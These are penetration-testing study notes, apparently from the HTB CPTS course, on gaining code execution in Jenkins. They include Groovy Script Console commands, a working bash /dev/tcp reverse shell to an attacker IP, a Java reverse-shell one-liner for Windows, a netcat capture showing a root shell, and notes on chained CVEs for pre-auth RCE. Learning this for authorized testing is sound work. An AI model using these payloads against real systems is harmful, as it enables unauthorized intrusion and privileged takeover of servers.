# Attacking Jenkins (CPTS Notes)

## Overview
Once valid (often weak/default) credentials are confirmed, Jenkins typically offers a **fast path to RCE** via its built-in **Script Console** — no need for a separate exploit, since the application itself is designed to run arbitrary code. Jenkins frequently runs as **root (Linux)** or **SYSTEM (Windows)**, making this an easy high-value win.

---

## Method 1: Script Console (Primary Attack Path)

**Location:**
```
http://jenkins.inlanefreight.local:8000/script
```

- Allows execution of **Apache Groovy** scripts — an object-oriented, Java-compatible language (similar to Python/Ruby)
- Groovy compiles to **Java Bytecode**, runs on any platform with a JRE
- Functions essentially as a **built-in web shell**

### Basic Command Execution (Linux Example)
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
**Result:** `uid=0(root) gid=0(root)` — confirms root-level execution

### Reverse Shell (Linux)
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
- Can also be automated via a **Metasploit module**

**Catch the shell:**
```
junior-security-analyst@htb[/htb]$ nc -lvnp 8443

connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id
uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i
root@app02:/var/lib/jenkins3#
```

### Windows Targets

**Simple command execution:**
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

**Options for interactive/remote access:**
- Add a local user → connect via **RDP** or **WinRM** (makes a system change — note for reporting)
- Use a **PowerShell download cradle** (e.g., `Invoke-PowerShellTcp.ps1`) to avoid persistent changes
- Use a **Java reverse shell** snippet directly in Groovy:
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
(Swap `host`/`port` for attacker IP/listener port)

## Method 2: Known Vulnerabilities / CVEs

### CVE-2018-1999002 + CVE-2019-1003000 (Chained)
- Combines two flaws to achieve **pre-authenticated RCE**
- Bypasses **script security sandbox** protection during script compilation
- Exploits a flaw in Jenkins' **dynamic routing** to bypass the **Overall/Read ACL**
- Uses Groovy to download and execute a **malicious JAR file**
- Allows users with only **read permissions** to bypass sandbox restrictions and execute code on the **Jenkins master**
- **Confirmed working against:** Jenkins **2.137**

### Jenkins 2.150.2 — Node.js Privilege Abuse
- Requires authentication, **but**:
  - If **anonymous users are enabled** (common/default in some setups), they get **JOB creation** and **BUILD** privileges by default
  - Attackers can abuse these privileges to execute code via **Node.js** build steps — effectively unauthenticated in practice

### General Notes
- RCE exploits for Jenkins are **version-specific** — always confirm version before attempting
- Current **LTS at time of writing: 2.303.1** — patches both flaws above
- Jenkins hardening matters precisely *because* so much built-in functionality (Script Console, build steps, plugins) can be weaponized

## Key Takeaways
- **Script Console = fastest and most reliable RCE path** once you have valid creds (or if auth is disabled)
- Jenkins commonly runs as **root/SYSTEM** — compromise often equals a privileged foothold
- Check for **anonymous access with JOB/BUILD privileges** — effectively bypasses the need for real credentials
- Chained CVEs (2018-1999002 + 2019-1003000) show that **pre-auth RCE is possible** on older versions (e.g., 2.137) via ACL bypass + sandbox escape
- Always verify version before relying on a specific public exploit
